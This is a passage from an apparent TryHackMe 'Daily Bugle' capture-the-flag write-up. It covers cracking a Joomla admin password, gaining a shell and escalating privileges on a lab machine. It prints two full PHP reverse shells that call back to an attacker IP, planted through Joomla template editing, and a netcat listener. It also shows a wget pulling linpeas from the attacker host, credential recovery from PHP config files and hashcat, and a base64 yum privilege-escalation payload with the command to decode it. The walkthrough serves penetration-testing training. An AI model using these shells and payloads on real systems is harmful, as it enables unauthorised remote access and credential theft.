Time.Started.....: Fri Aug <span style="color:#ae81ff">28</span> 19:23:14 <span style="color:#ae81ff">2020</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">7</span> mins, <span style="color:#ae81ff">14</span> secs<span style="color:#f92672">)</span>
Time.Estimated...: Fri Aug <span style="color:#ae81ff">28</span> 19:30:28 <span style="color:#ae81ff">2020</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
Speed.#1.........:      <span style="color:#ae81ff">108</span> H/s <span style="color:#f92672">(</span>13.91ms<span style="color:#f92672">)</span> @ Accel:4 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests
Progress.........: 46848/14344385 <span style="color:#f92672">(</span>0.33%<span style="color:#f92672">)</span>
Rejected.........: 0/46848 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
Restore.Point....: 46824/14344385 <span style="color:#f92672">(</span>0.33%<span style="color:#f92672">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:960-1024
Candidates.#1....: supaman -&gt; smokers

Started: Fri Aug <span style="color:#ae81ff">28</span> 19:22:38 <span style="color:#ae81ff">2020</span>
Stopped: Fri Aug <span style="color:#ae81ff">28</span> 19:30:29 <span style="color:#ae81ff">2020</span>
</code></pre></div><p>Now that we got a password, let&rsquo;s log into Joomla admin:</p>
<p>Note: We also can log in into the non-admin section of the blog, but what we really want is that <strong>/administrator/</strong> path that we found earlier.</p>
<p><img src="https://i.imgur.com/91n6CmU.png" alt="Logged in as Jonah"></p>
<p>Let&rsquo;s see if we can add a new post, but the code being a php reverse shell. Not sure if this will work:</p>
<p>Looking around for PHP Reverse shells, I found this one <a href="https://gist.github.com/rshipp/eee36684db07d234c1cc">here</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">/*<span style="color:#75715e">&lt;?php</span> <span style="color:#75715e">/**/</span> <span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>); $ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.13.0.34&#39;</span>; $port <span style="color:#f92672">=</span> <span style="color:#ae81ff">2112</span>; <span style="color:#66d9ef">if</span> (($f <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;stream_socket_client&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_callable</span>($f)) { $s <span style="color:#f92672">=</span> $f(<span style="color:#e6db74">&#34;tcp://</span><span style="color:#e6db74">{</span>$ip<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>$port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>); $s_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;stream&#39;</span>; } <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$s <span style="color:#f92672">&amp;&amp;</span> ($f <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;fsockopen&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_callable</span>($f)) { $s <span style="color:#f92672">=</span> $f($ip, $port); $s_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;stream&#39;</span>; } <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$s <span style="color:#f92672">&amp;&amp;</span> ($f <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;socket_create&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_callable</span>($f)) { $s <span style="color:#f92672">=</span> $f(<span style="color:#a6e22e">AF_INET</span>, <span style="color:#a6e22e">SOCK_STREAM</span>, <span style="color:#a6e22e">SOL_TCP</span>); $res <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">socket_connect</span>($s, $ip, $port); <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$res) { <span style="color:#66d9ef">die</span>(); } $s_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;socket&#39;</span>; } <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$s_type) { <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;no socket funcs&#39;</span>); } <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$s) { <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;no socket&#39;</span>); } <span style="color:#66d9ef">switch</span> ($s_type) { <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;stream&#39;</span><span style="color:#f92672">:</span> $len <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($s, <span style="color:#ae81ff">4</span>); <span style="color:#66d9ef">break</span>; <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;socket&#39;</span><span style="color:#f92672">:</span> $len <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket_read</span>($s, <span style="color:#ae81ff">4</span>); <span style="color:#66d9ef">break</span>; } <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$len) { <span style="color:#66d9ef">die</span>(); } $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">unpack</span>(<span style="color:#e6db74">&#34;Nlen&#34;</span>, $len); $len <span style="color:#f92672">=</span> $a[<span style="color:#e6db74">&#39;len&#39;</span>]; $b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>; <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">strlen</span>($b) <span style="color:#f92672">&lt;</span> $len) { <span style="color:#66d9ef">switch</span> ($s_type) { <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;stream&#39;</span><span style="color:#f92672">:</span> $b <span style="color:#f92672">.=</span> <span style="color:#a6e22e">fread</span>($s, $len<span style="color:#f92672">-</span><span style="color:#a6e22e">strlen</span>($b)); <span style="color:#66d9ef">break</span>; <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;socket&#39;</span><span style="color:#f92672">:</span> $b <span style="color:#f92672">.=</span> <span style="color:#a6e22e">socket_read</span>($s, $len<span style="color:#f92672">-</span><span style="color:#a6e22e">strlen</span>($b)); <span style="color:#66d9ef">break</span>; } } $GLOBALS[<span style="color:#e6db74">&#39;msgsock&#39;</span>] <span style="color:#f92672">=</span> $s; $GLOBALS[<span style="color:#e6db74">&#39;msgsock_type&#39;</span>] <span style="color:#f92672">=</span> $s_type; <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">extension_loaded</span>(<span style="color:#e6db74">&#39;suhosin&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">ini_get</span>(<span style="color:#e6db74">&#39;suhosin.executor.disable_eval&#39;</span>)) { $suhosin_bypass<span style="color:#f92672">=</span><span style="color:#a6e22e">create_function</span>(<span style="color:#e6db74">&#39;&#39;</span>, $b); $suhosin_bypass(); } <span style="color:#66d9ef">else</span> { <span style="color:#66d9ef">eval</span>($b); } <span style="color:#66d9ef">die</span>();
</code></pre></div><p>We paste that in the view code of the blog entry:</p>
<p><img src="https://i.imgur.com/PhmwKsJ.png" alt="blog entry source code view"></p>
<p>Let&rsquo;s fire up a netcat listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ nc -nlvp <span style="color:#ae81ff">2112</span>                                              
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">2112</span> ...

</code></pre></div><p>Now let&rsquo;s publish the blog post and see if it gets triggered right there or if we need to visit it. This might not work at all if the post code is not processed as PHP code at all.</p>
<p>That did not work at all. The code of the blog post is not executed as php code, even if it is. We need to find how to upload a file possibly.</p>
<p>[Googling&hellip; Please wait]</p>
<p>We try to add php file extension as one of the permitted formats for uploading media:</p>
<p><img src="https://i.imgur.com/GOiuW3p.png" alt="We try to add php as a valid upload format"></p>
<p>That did not work either&hellip;</p>
<p>Another thing we can try is using the templates administration panel, with any of the templates we find a file to edit and include our exploit.
This seems to kind of work, we do get a connection back to our netcat listener but it closes right after and does not seems to respond to any command.</p>
<p><img src="https://i.imgur.com/Y1MLMpv.png" alt="Using a template file with explioit and preview feature"></p>
<p>Since this kid of works, I&rsquo;d like to try another variation of a PHP Rev shell, lets see what we find:</p>
<p>I found <a href="https://alamot.github.io/reverse_shells/">this interesting site</a>, which has a php one-liner from pentestmonkey that could try, looks kind of similar to the one we have. We need to update IP and PORT. Then we do the same as before, using any php of a template in the templates manager we add our code and save. Then we trigger the &ldquo;Preview Template&rdquo; as before.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">// pentestmonkey one-liner ^_^
<span style="color:#75715e">&lt;?php</span> <span style="color:#a6e22e">set_time_limit</span> (<span style="color:#ae81ff">0</span>); $VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1.0&#34;</span>; $ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.13.0.34&#34;</span>; $port <span style="color:#f92672">=</span> <span style="color:#ae81ff">2112</span>; $chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1400</span>; $write_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>; $error_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>; $shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uname -a; w; id; /bin/bash -i&#34;</span>; $daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">function_exists</span>(<span style="color:#e6db74">&#34;pcntl_fork&#34;</span>)) { $pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcntl_fork</span>(); <span style="color:#66d9ef">if</span> ($pid <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Cannot fork&#34;</span>); <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>); } <span style="color:#66d9ef">if</span> ($pid) { <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>); } <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">posix_setsid</span>() <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;Error: Cannot setsid()&#34;</span>); <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>); } $daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; } <span style="color:#66d9ef">else</span> { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span>); } <span style="color:#a6e22e">chdir</span>(<span style="color:#e6db74">&#34;/&#34;</span>); <span style="color:#a6e22e">umask</span>(<span style="color:#ae81ff">0</span>); $sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>($ip, $port, $errno, $errstr, <span style="color:#ae81ff">30</span>); <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$sock) { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$errstr</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">$errno</span><span style="color:#e6db74">)&#34;</span>); <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>); } $descriptorspec <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>), <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>), <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)); $process <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>($shell, $descriptorspec, $pipes); <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_resource</span>($process)) { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Cannot spawn shell&#34;</span>); <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>); } <span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">stream_set_blocking</span>($sock, <span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;Successfully opened reverse shell to </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">:</span><span style="color:#e6db74">$port</span><span style="color:#e6db74">&#34;</span>); <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) { <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feof</span>($sock)) { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Shell connection terminated&#34;</span>); <span style="color:#66d9ef">break</span>; } <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feof</span>($pipes[<span style="color:#ae81ff">1</span>])) { <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Shell process terminated&#34;</span>); <span style="color:#66d9ef">break</span>; } $read_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>($sock, $pipes[<span style="color:#ae81ff">1</span>], $pipes[<span style="color:#ae81ff">2</span>]); $num_changed_sockets <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream_select</span>($read_a, $write_a, $error_a, <span style="color:#66d9ef">null</span>); <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($sock, $read_a)) { <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;SOCK READ&#34;</span>); $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($sock, $chunk_size); <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;SOCK: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>); <span style="color:#a6e22e">fwrite</span>($pipes[<span style="color:#ae81ff">0</span>], $input); } <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($pipes[<span style="color:#ae81ff">1</span>], $read_a)) { <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDOUT READ&#34;</span>); $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">1</span>], $chunk_size); <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDOUT: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>); <span style="color:#a6e22e">fwrite</span>($sock, $input); } <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($pipes[<span style="color:#ae81ff">2</span>], $read_a)) { <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDERR READ&#34;</span>); $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">2</span>], $chunk_size); <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDERR: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>); <span style="color:#a6e22e">fwrite</span>($sock, $input); } } <span style="color:#a6e22e">fclose</span>($sock); <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">0</span>]); <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">1</span>]); <span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">2</span>]); <span style="color:#a6e22e">proc_close</span>($process); <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">printit</span> ($string) {  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$daemon) { <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$string\\n</span><span style="color:#e6db74">&#34;</span>; } } <span style="color:#75715e">?&gt;</span>

</code></pre></div><p>This time it works! we have our basic reverse shell working.</p>
<p><img src="https://i.imgur.com/AjMcgoj.png" alt=""></p>
<p>Let&rsquo;s see if we can answer the following room question now.</p>
<h2 id="task-2-question-3-what-is-the-user-flag">[TASK 2] Question #3: What is the user flag?</h2>
<p>Let&rsquo;s see if we can get us a better shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><p>That did not work. Let&rsquo;s create an HTTP server to serve our friend <strong>linpeas.sh</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/opt/privilege-escalation-awesome-scripts-suite/linPEAS<span style="color:#f92672">]</span>
└─$ sudo python -m SimpleHTTPServer                                                                                                      <span style="color:#ae81ff">1</span> ⨯
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> ...
</code></pre></div><p>In our revshell we type in the following wget command to and get our file loaded to the server:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">bash-4.2$ wget http:/10.13.0.34:8000/linPeas.sh
wget http:/10.13.0.34:8000/linPeas.sh
--2020-08-28 20:30:51--  ftp://http//10.13.0.34:8000/linPeas.sh
           <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;linPeas.sh&#39;</span>
Resolving http <span style="color:#f92672">(</span>http<span style="color:#f92672">)</span>... failed: Name or service not known.
wget: unable to resolve host address <span style="color:#e6db74">&#39;http&#39;</span>
bash-4.2$ wget http://10.13.0.34:8000/linpeas.sh
wget http://10.13.0.34:8000/linpeas.sh
--2020-08-28 20:31:25--  http://10.13.0.34:8000/linpeas.sh
Connecting to 10.13.0.34:8000... connected.
HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
Length: <span style="color:#ae81ff">235695</span> <span style="color:#f92672">(</span>230K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/x-sh<span style="color:#f92672">]</span>
Saving to: <span style="color:#e6db74">&#39;linpeas.sh&#39;</span>

100%<span style="color:#f92672">[======================================</span>&gt;<span style="color:#f92672">]</span> 235,695      154KB/s   in 1.5s   

2020-08-28 20:31:28 <span style="color:#f92672">(</span><span style="color:#ae81ff">154</span> KB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;linpeas.sh&#39;</span> saved <span style="color:#f92672">[</span>235695/235695<span style="color:#f92672">]</span>

bash-4.2$ chmod +x linpeas.sh
chmod +x linpeas.sh
bash-4.2$ 
</code></pre></div><p>Now we run linpeas, assuming it let us. And yep it did. I don&rsquo;t think pasting the output of linpeas would help to this already <strong>not-short-at-all</strong> writeup.</p>
<p>Looking throuhg the results I see we find some users and groups and a password (also a hash):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Last time logon each user
Username         Port     From             Latest                                                                                 
root             pts/0    netwars          Mon Dec <span style="color:#ae81ff">16</span> 05:11:46 -0500 <span style="color:#ae81ff">2019</span>
jjameson         pts/0    netwars          Mon Dec <span style="color:#ae81ff">16</span> 05:14:55 -0500 <span style="color:#ae81ff">2019</span>

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password policy
PASS_MAX_DAYS   <span style="color:#ae81ff">99999</span>                                                                                                             
PASS_MIN_DAYS   <span style="color:#ae81ff">0</span>
PASS_WARN_AGE   <span style="color:#ae81ff">7</span>
ENCRYPT_METHOD SHA512

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Searching passwords in config PHP files
        public $password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{REDACTED}&#39;</span>;   

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Searching specific hashes inside files - less false positives <span style="color:#f92672">(</span>limit 70<span style="color:#f92672">)</span>

/var/www/html/libraries/vendor/ircmaxell/password-compat/lib/password.php:$2y$04$usesomesi<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>8K30oukPsA.ztMG 

</code></pre></div><p>We can crack that hash but not sure it is anything useful:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ hashcat -m3200 -a0 hash2.txt /usr/share/wordlists/rockyou.txt
hashcat <span style="color:#f92672">(</span>v6.1.1<span style="color:#f92672">)</span> starting...

OpenCL API <span style="color:#f92672">(</span>OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [The pocl project]</span>
<span style="color:#f92672">=============================================================================================================================</span>
* Device <span style="color:#75715e">#1: pthread-AMD Ryzen 7 3800X 8-Core Processor, 10871/10935 MB (4096 MB allocatable), 6MCU</span>

Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
Maximum password length supported by kernel: <span style="color:#ae81ff">72</span>

Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
Rules: <span style="color:#ae81ff">1</span>

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">65</span> MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: <span style="color:#ae81ff">14344385</span>
* Bytes.....: <span style="color:#ae81ff">139921507</span>
* Keyspace..: <span style="color:#ae81ff">14344385</span>

$2y$04$use<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>oG8K30oukPsA.ztMG:<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
Hash.Target......: $2y$04$us<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>LeakoG8K30ou...A.ztMG
Time.Started.....: Fri Aug <span style="color:#ae81ff">28</span> 20:45:18 <span style="color:#ae81ff">2020</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
Time.Estimated...: Fri Aug <span style="color:#ae81ff">28</span> 20:45:18 <span style="color:#ae81ff">2020</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
Speed.#1.........:     <span style="color:#ae81ff">2487</span> H/s <span style="color:#f92672">(</span>10.06ms<span style="color:#f92672">)</span> @ Accel:8 Loops:16 Thr:1 Vec:8
Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests
Progress.........: 48/14344385 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
Rejected.........: 0/48 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
Restore.Point....: 0/14344385 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-16
Candidates.#1....: <span style="color:#ae81ff">123456</span> -&gt; <span style="color:#ae81ff">1234567890</span>

Started: Fri Aug <span style="color:#ae81ff">28</span> 20:45:17 <span style="color:#ae81ff">2020</span>
Stopped: Fri Aug <span style="color:#ae81ff">28</span> 20:45:20 <span style="color:#ae81ff">2020</span>

</code></pre></div><p>As it turns out the output from linpeas already revealed a password we can use, if you look for it under public PHP configs you&rsquo;ll find it, <strong>jjameson:{REDACTED}</strong></p>
<p>From there we can get the user flag:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">bash-4.2$ su jjameson
su jjameson
Password: <span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>

<span style="color:#f92672">[</span>jjameson@dailybugle tmp<span style="color:#f92672">]</span>$ cd ~
cd ~
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ ls
ls
user.txt
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ cat user.txt
cat user.txt
27a<span style="color:#f92672">{</span>REDACTED_USER_FLAG<span style="color:#f92672">}</span>442e
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ 
</code></pre></div><h2 id="task-2-question-3-what-is-the-root-flag">[TASK 2] Question #3: What is the root flag?</h2>
<p>If we run <strong>sudo -l</strong> we see that jjameson can run something called <em>yum</em>, I&rsquo;ll have to google what that is. Before we do that, let&rsquo;s run linpeas again with our newly adquired jjameson user:</p>
<p>Looking around the web I came across this other exploitiation for Yum. Check it out <a href="https://lsdsecurity.com/2019/01/more-linux-privilege-escalation-yum-rpm-dnf-nopasswd-rpm-payloads/">here</a>.</p>
<p>It looks like this:</p>
<pre><code class="language-base64" data-lang="base64">+Vippeef3FNn/eckVFlbk6H9rGKz//P672KD2D8Ws/7/v7E5o0r4wSj
pNhnztp+T2THrB6N9MXlQJfds/pfeVT/9f6GX/vb2Ff2bbpcXWO1/GL52+bCsv7PPYvWu2VKXzp8
U27t78zLwbct9h+/t/NHonrLlMrQz7PeX3BfXyW8tWuz/+OnN6aw/lLr7X15KfPY3aNTqr+oyloX
SZRsrjU5nynm2p/ZqFq1ONqSX9C24vGezv3fIuxd9S+mm7/KvJkv/3iLuov9yUKpkmV3PNbcPncv
x/qzc/QXT/anZ0uizu3a8mhnv79y3t+XjAyo4MfrOuYZiV0TGDQYGFISSxLhSUGBiNRkaoIlNVy+
nL7A0oCBqTg42ICX5YXJjNyMnKSUhJyMFJaw9LSEvGMLEryqlxsaTBGbriKmqXHh8KqDHF++XPaa
vJl70+XMGXwe/fXFwcnNF38sZ3c4Uh9Vty+ukE33DYPrhpmdnO9+mBu5HtnfKdjcqBhgafCPN+Oh
RInBocfxkYH2msb++y2au7nPeHixGLHfClzckOfgv3/Ljo5juQxGr+qLmT9f/DRfjkHo/1HJTteV
Jt6sKsf3L2xsXPgw489lZoXj9V51Rr6XGCQ/5mdZ3fq3nNuh//+jpjl/zgi9UmO+9Pj+iQM1W/76
izco/5tsLPT5UnDxp8tfL63W2NYc8Pv+iQscuv98e3x93W7//8Lw6a4MT/Zyi2MGhp/nfXqWbSRQ
WB0h+W/i/muGWWVh5ftdg5wuKW7cE7xHLWZZtO27N3M/b7rzrtaif0nZC83L6Z97Xuk+l9J5W/x/
/+znftHLGC73snb9n/7FVuRa/7ttNUrhvyKdY/qz/QrOn98Sd1Th+9Pi7a36H7xT/HVj9CL2BqWd
vGXM3bxkUfmqP9o39f5vrFvQnCjS0xRowOV2UEOCdXECFk6bLAND7aMfHaAUAACKx3++WAQAAA==
</code></pre><p>The page says we need to make sure to save it as</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Again, be sure to save as .txt</span>  
cat *.txt |base64 -d|gzip -d &gt; debsploit.deb
